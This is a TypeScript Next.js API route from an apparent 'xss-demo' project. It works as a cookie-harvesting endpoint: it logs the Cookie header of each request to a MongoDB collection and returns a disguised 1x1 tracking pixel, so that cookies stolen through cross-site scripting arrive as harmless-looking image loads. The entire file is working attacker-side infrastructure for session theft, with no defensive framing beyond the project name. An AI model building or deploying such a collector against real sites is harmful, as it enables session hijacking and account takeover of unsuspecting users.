import clientPromise from "../../../../lib/mongodb";

export async function GET(req: Request) {
    try {
      const cookieHeader = req.headers.get("cookie");
  
      const client = await clientPromise;
      const db = client.db("xss-demo");
  
      await db.collection("cookies").insertOne({
        time: new Date(),
        cookie: cookieHeader,
      });
  
      // 👉 trả về pixel 1x1 (tránh lỗi ảnh)
      const pixel = Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=",
        "base64"
      );
  
      return new Response(pixel, {
        headers: {
          "Content-Type": "image/png",
        },
      });
    } catch {
      return new Response(null, { status: 500 });
    }
  }